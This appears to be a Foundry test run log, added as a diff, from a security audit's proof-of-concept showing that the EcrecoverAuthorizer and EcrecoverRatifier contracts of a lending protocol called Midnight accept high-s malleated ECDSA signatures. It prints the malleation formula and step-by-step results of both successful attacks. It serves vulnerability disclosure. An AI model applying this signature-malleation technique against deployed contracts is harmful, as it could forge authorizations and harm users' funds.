@@ -1,0 +1,107 @@
+No files changed, compilation skipped
+
+Ran 2 tests for test/asyamFindings/PoC_SignatureMalleability.t.sol:PoCSignatureMalleabilityTest
+[PASS] testPoC_AuthorizerAcceptsHighSMalleatedSignature() (gas: 143406)
+Logs:
+  
+  ==============================================================
+  PoC 2: EcrecoverAuthorizer accepts high-s malleated signature
+  ==============================================================
+  [1] Allowing EcrecoverAuthorizer to manage borrower authorization
+      borrower / authorizer: 0x7d8A6b343f153D9d026466636ED35cA13C367fD2
+      ecrecoverAuthorizer: 0xF62849F9A0B5Bf2913b396098F7c7019b51A820a
+      Midnight says authorizer is authorized: true
+  [2] Building Authorization struct
+      authorization.authorizer: 0x7d8A6b343f153D9d026466636ED35cA13C367fD2
+      authorization.authorized: 0xfe6F73da54CC24711cA1224AfA2814C9b630eD09
+      authorization.isAuthorized: true
+      authorization.nonce: 0
+      authorization.deadline: 86401
+      current block.timestamp: 1
+  [3] Computing EIP-712 struct hash
+  0xf3430e9190ed8aeca966e54b0ff910ddb7b0b7bd83dae9634c29cd28998543d3
+  [4] Computing EIP-712 domain separator
+      chainid: 31337
+      verifying contract: 0xF62849F9A0B5Bf2913b396098F7c7019b51A820a
+  0xabbf8451b4874b035baec90f10a3026bb60623e5ba5ee5a62ef42d549ee1a290
+  [5] Computing final digest
+  0x38190774115cfac003e0ae5c084f46061466b33f507be334b242c0b316adc786
+  [6] Creating canonical low-s signature from borrower private key
+      original.v: 27
+  0x32281eb613d23373ff015036c35cf1fcdff7aa4dc8b9676558bc24021aba821a
+  0x3e35f9c6dc88bd106eb3900d65aba21cc8336b75ed19174736156ea957b46f8a
+      original.s uint: 28138763402730516531293648934097593259886728748158788890074755960446007930762
+      secp256k1 half-n: 57896044618658097711785492504343953926418782139537452191302581570759080747168
+  [7] Malleating authorization signature
+      malleated.v: 28
+  0x32281eb613d23373ff015036c35cf1fcdff7aa4dc8b9676558bc24021aba821a
+  0xc1ca0639237742ef914c6ff29a545de1f27b7170c22f88f489bcefe37881d1b7
+      malleated.s uint: 87653325834585678892277336074590314592950835530916115492530407181072153563575
+  [8] Checking preconditions
+      OK: original signature is low-s
+      OK: malleated signature is high-s
+  [9] State before submitting malleated authorization
+      midnight.isAuthorized(authorizer, target): false
+      authorizer nonce before: 0
+  [10] Calling EcrecoverAuthorizer.setIsAuthorized with high-s signature
+  [11] State after submitting malleated authorization
+      midnight.isAuthorized(authorizer, target): true
+      authorizer nonce after: 1
+      expected nonce after: 1
+  [12] SUCCESS: Authorizer accepted a high-s malleated signature
+  ==============================================================
+  
+
+[PASS] testPoC_RatifierAcceptsHighSMalleatedSignature() (gas: 71955)
+Logs:
+  
+  ============================================================
+  PoC 1: EcrecoverRatifier accepts high-s malleated signature
+  ============================================================
+  [1] Creating signed offer
+      lender / maker: 0xb012341CA6E91C00A290F658fbaA5211F2559fB1
+      offer.buy: true
+      offer.maker: 0xb012341CA6E91C00A290F658fbaA5211F2559fB1
+      offer.ratifier: 0x2e234DAe75C793f67A35089C9d99245E1C58470b
+      offer.maxUnits: 1
+      offer.start: 1
+      offer.expiry: 86401
+      market.loanToken: 0xc7183455a4C133Ae270771860664b6B7ec320bB1
+      market.maturity: 2592001
+      collateral token: 0xa0Cb889707d426A7A386870A03bc70d1b0697598
+      collateral oracle: 0xA4AD4f68d0b91CFD19687c881e50f3A00242828c
+      collateral lltv: 915000000000000000
+      collateral maxLif: 1000000000000000000
+  [2] Hashing offer into ratifier root
+  0xebc986c3f15b3848e6e7503d5d6ef2f379aeb41dc3d73eacad90a01ab1fcbc08
+  [3] Creating canonical low-s signature from lender private key
+      original.v: 27
+  0x3b779cb11c80d4ed428fbf9ce87f0d245ef19e4f4a87eb0aa0d194f30a5115c7
+  0x287449b9327793d94002ea56d06876c69ee275e326f33a6b4398474d09f16bbc
+      original.s uint: 18297977023233203178790776205861945222158762035903146081925200542704012979132
+      secp256k1 half-n: 57896044618658097711785492504343953926418782139537452191302581570759080747168
+  [4] Malleating signature
+      Formula: s' = secp256k1n - s
+      Formula: v' = 27 <-> 28
+      malleated.v: 28
+  0x3b779cb11c80d4ed428fbf9ce87f0d245ef19e4f4a87eb0aa0d194f30a5115c7
+  0xd78bb646cd886c26bffd15a92f9789381bcc6703885565d07c3a173fc644d585
+      malleated.s uint: 97494112214082992244780208802825962630678802243171758300679962598814148515205
+  [5] Checking preconditions
+      OK: original signature is low-s
+      OK: malleated signature is high-s
+  [6] Encoding ratifierData with malleated signature
+      proof length: 0
+      ratifierData length: 224
+  [7] Calling EcrecoverRatifier.isRatified from Midnight address
+  [8] Ratifier result
+  0x7f87788ea698181ea4d28d1576d0ba4fc92c0dbe5bf75b43692af2ce91dbaea2
+      expected CALLBACK_SUCCESS:
+  0x7f87788ea698181ea4d28d1576d0ba4fc92c0dbe5bf75b43692af2ce91dbaea2
+  [9] SUCCESS: Ratifier accepted a high-s malleated signature
+  ============================================================
+  
+
+Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 6.46ms (2.78ms CPU time)
+
+Ran 1 test suite in 20.37ms (6.46ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
